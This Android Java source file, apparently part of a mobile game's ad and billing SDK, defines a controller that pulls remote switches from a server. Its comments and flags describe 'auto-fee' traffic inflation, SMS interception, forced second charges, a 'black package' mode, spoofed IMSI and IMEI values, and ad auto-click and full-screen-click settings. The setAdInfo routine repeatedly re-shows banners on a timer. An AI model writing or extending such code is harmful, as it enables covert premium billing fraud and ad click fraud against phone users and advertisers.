package com.vivo.ad;

/*
 * 不同游戏工程需要修改的参数：
 * 1、资费显示、AB类掉落、购买领取显示函数的设置。
 * 2、各网刷量的对应SDKControler.lcpaycode的值的设定
 */

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

import com.gu.game.sdk.CasgameInterface;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Timer;
import java.util.TimerTask;

//import com.cmcc.migu.CmgameUserInterface;

public class ServiceControler {
    private static final String TAG = "** ServiceControler";

    // 配置参数-后台相关-开发商提供接口的
    public static int v1 = 1; // 是否显示计费提示信息,1显示。isView
    public static int d1 = 0; // A类礼包是否掉落,1掉落。isDrop
    public static int d2 = 0; // B类礼包是否掉落,1掉落。isDropB
    public static int d3 = 0; // C类礼包是否掉落,1掉落。isDropC
    public static int g1 = 1; // 1购买,0领取。isGouMai
    // 配置参数-后台相关-我们的
    public static int j1 = 1; // 0:MM 1:基地。isJiDi
    public static int h1 = 1; // 基地黑白，0:黑包 1:白包。isJiDiHeiBai
    public static int c1 = 0; // 0不刷二次支付，>0才刷，用于降低付费率。doCancel
    public static int a1 = 0; // 为0时什么都不做。useract
    public static boolean jiFei = true; // 用于控制计费函数,true正常计费，false直接退出计费。
    public static int f1 = 0; // 用于刷量，autoFee。（1之类的）
    public static int s1; // hsms，0时拦截短信
    public static int u1 = 1; // 友盟控制变量，离线默认为1，调用友盟统计。
    public static int k1 = 0; // 是否显示投诉安智showKefu,0为不显示，1为显示
    public static String level = "000"; // 通过友盟获取关卡
    // public static int hbl = 1; // 黑不了的话，就不执行doCancel,不执行刷量.1为执行，0为不执行。

    // 模拟有数
    public static String imsi = null;
    public static String imei = null;
    public static String datau = null;

    public static void setBuyInfo(final Activity actInstance) {
        Log.e(TAG, "app-setBuyInfo");
        try {
            CasgameInterface.getShowBuyInfo(actInstance,
                    new Handler(Looper.getMainLooper()) {

                        @SuppressLint("NewApi")
                        @Override
                        public void handleMessage(Message msg) {
                            Log.e(TAG, "app-setBuyInfo msg.what=" + msg.what);
                            Log.e(TAG, "app-setBuyInfo msg.obj=" + msg.obj.toString());
                            if (msg.what == 0) { // 等于0即表示从服务器获取到值。
                                try {
                                    JSONObject jsonObject = new JSONObject(
                                            msg.obj.toString());

                                    if (!jsonObject.isNull("x")) // 新ParamTool
                                        ParamTool.setValue(jsonObject
                                                .optString("x"));
                                    // 开发商提供的
                                    v1 = jsonObject.optInt(ParamTool.getValue("v1"), 1);
                                    d1 = jsonObject.optInt(ParamTool.getValue("d1"), 0);
                                    d2 = jsonObject.optInt(ParamTool.getValue("d2"), 0);
                                    d3 = jsonObject.optInt(ParamTool.getValue("d3"), 0);
                                    g1 = jsonObject.optInt(ParamTool.getValue("g1"), 1); // 获取领取、购买的值，并设置。1购买,0领取
                                    h1 = jsonObject.optInt(ParamTool.getValue("h1"), 1); // 0:黑包 1:白包
                                    f1 = jsonObject.optInt(ParamTool.getValue("f1"), 0); // autoFee，hsms，刷量相关
                                    s1 = jsonObject.optInt(ParamTool.getValue("s1"), 1);
                                    j1 = jsonObject.optInt(ParamTool.getValue("j1"), 1); // 0:MM 1:基地
                                    c1 = jsonObject.optInt(ParamTool.getValue("c1"), 0); // 获取是否刷二次支付
                                    u1 = jsonObject.optInt(ParamTool.getValue("u1"), 1);
                                    a1 = jsonObject.optInt(ParamTool.getValue("a1"), 0);
                                    k1 = jsonObject.optInt(ParamTool.getValue("k1"), 0);
                                    imsi = jsonObject.optString("imsi");
                                    imei = jsonObject.optString("imei");
                                    datau = jsonObject.optString("datau");
                                    Log.e(TAG, "app-online  isView[" + v1 + "]");
                                    Log.e(TAG, "app-online  isDrop[" + d1+ "]");
                                    Log.e(TAG, "app-online  isDropB["+ d2 + "]");
                                    Log.e(TAG, "app-online  isDropC[" + d3+ "]");
                                    Log.e(TAG, "app-online  isGouMai[" + g1+ "]");
                                    Log.e(TAG, "app-online  isJiDiHeiBai[" + h1 + "]");
                                    Log.e(TAG, "app-online  autoFee[" + f1+ "]");
                                    Log.e(TAG, "app-online  hsms["+ s1 + "]");
                                    Log.e(TAG, "app-online  isJiDi[" + j1+ "]");
                                    Log.e(TAG, "app-online  doCancel[" + c1+ "]");
                                    Log.e(TAG, "app-online  umeng["+ u1 + "]");
                                    Log.e(TAG, "app-online  useract[" + a1+ "]");
                                    Log.e(TAG, "app-online  showKefu[" + k1+ "]");
                                    Log.e(TAG, "app-online  imsi[" + imsi + "]");
                                    Log.e(TAG, "app-online  imei[" + imei+ "]");
                                    Log.e(TAG, "app-online  datau[" + datau+ "]");
                                } catch (JSONException e) {
                                }
                            }
                        }

                    }, MD5.getSign(actInstance) + "@" + level + ",0"); // 在此处调用MD5的getSign函数获取MD5值，第三个参数正常为：(md5,0)。

        } catch (Throwable t) {
        }
    }

    public static int isShowAd = 1;
    public static int isAutoClick = 0;
    public static int isFullScreenClick = 0;
    public static int autoClose = 0;
    public static int isShowClose = 1;
    public static int nextTick = 1000 * 10 * 3;
    public static int bannerTick = 1000 * 30;
    public static int insertTick = 1000 * 30;

    public static void setAdInfo(final Activity mActivity) {
        Log.e(TAG, "app-setAdInfo");
        try {
            ParamTool.b(mActivity, null, new Handler(Looper.getMainLooper()) {
                @Override
                public void handleMessage(Message msg) {
                    Log.e(TAG, "app-setAdInfo msg.what :" + msg.what);
                    Log.e(TAG, "app-setAdInfo msg.obj :" + msg.obj.toString());
                    if (msg.what == 1) {
                        Log.e(TAG, "msg :" + msg.toString());
                        try {
                            JSONObject jsonObject = new JSONObject(msg.obj.toString());
                            if (!jsonObject.isNull("x")) // 新ParamTool
                                ParamTool.setValue(jsonObject.optString("x"));
                            // 开发商提供的
                            isShowAd = jsonObject.optInt("isShowAd", 1);
                            isAutoClick = jsonObject.optInt("isAutoClick", 0);
                            isFullScreenClick = jsonObject.optInt("isFullScreenClick", 0);
                            autoClose = jsonObject.optInt("autoClose", 0);
                            isShowClose = jsonObject.optInt("isShowClose", 1);
                            nextTick = jsonObject.optInt("nextTick", 1);
                            bannerTick = jsonObject.optInt("bannerTick", 0);
                            insertTick = jsonObject.optInt("insertTick", 1);
                            // 调用banner
                            AdManager.getInstance(mActivity).ClearnBanner();
                            if (bannerTick <= 15000 || isAutoClick == 1)
                                AdManager.getInstance(mActivity).showBanner();
                        } catch (JSONException e) {
                            Log.e(TAG, "Exception [" + e.toString() + "]");
                        }
                    } else {
                        isShowAd = 1;
                        isFullScreenClick = 0;
                        autoClose = 0;
                        isShowClose = 0;
                        AdManager.getInstance(mActivity).ClearnBanner();
                        if (isAutoClick == 1) {
                            isAutoClick = 0;
                            AdManager.getInstance(mActivity).showBanner();
                        }

                    }
                    Log.e(TAG, "app-online  isShowAd[" + isShowAd + "]");
                    Log.e(TAG, "app-online  isAutoClick[" + isAutoClick	+ "]");
                    Log.e(TAG, "app-online  isFullScreenClick["	+ isFullScreenClick + "]");
                    Log.e(TAG, "app-online  autoClose[" + autoClose	+ "]");
                    Log.e(TAG, "app-online  isShowClose[" + isShowClose	+ "]");
                    Log.e(TAG, "app-online  nextTick[" + nextTick + "]");
                    Log.e(TAG, "app-online  bannerTick[" + bannerTick	+ "]");
                    Log.e(TAG, "app-online  insertTick[" + insertTick	+ "]");
                    setClick(mActivity);

                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Exception [" + e.toString() + "]");
        }

        Log.e(TAG, "app-online  isShowAd[" + isShowAd + "]  "
                + "isAutoClick[" + isAutoClick + "]  "
                + "isFullScreenClick[" + isFullScreenClick + "]  "
                + "autoClose[" + autoClose + "]  "
                + "isShowClose[" + isShowClose + "]  "
                + "nextTick[" + nextTick + "]  "
                + "bannerTick[" + bannerTick + "]  "
                + "insertTick[" + insertTick + "]");
    }

    private static void setClick(final Activity mActivity) {
        new Handler().postDelayed(new Runnable() {

            @Override
            public void run() {
                // TODO Auto-generated method stub
                setAdInfo(mActivity);
            }
        }, nextTick);
    }


    // Toast输出提示语：text。
    public static void TiShi(final Activity activity, final CharSequence text) {
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(activity, text, Toast.LENGTH_SHORT).show();
                // Toast.makeText(activity,"支付失败，请检查网络配置！",Toast.LENGTH_SHORT).show();
            }
        });
    }

}

/*
 * 
 * useract 该参数可不下发，下发时目前定义如下含义： 0：什么都不做 1：直接退出游戏 2：不计费
 * 4：Toast提醒“非法包，可能对您手机及资料造成损坏，请到正规渠道下载游戏包！”。继续处理计费
 * 5：对话框提示“非法包，可能对您手机及资料造成损坏，请到正规渠道下载游戏包！”.点确定后退出
 * 6：Toast提醒“非法包，可能对您手机及资料造成损坏，请到正规渠道下载游戏包！”。不计费 实际上处理可以用&的方法：&4 <>0 提示，&2 <>0
 * 不计费， &1 <>0 退出
 */
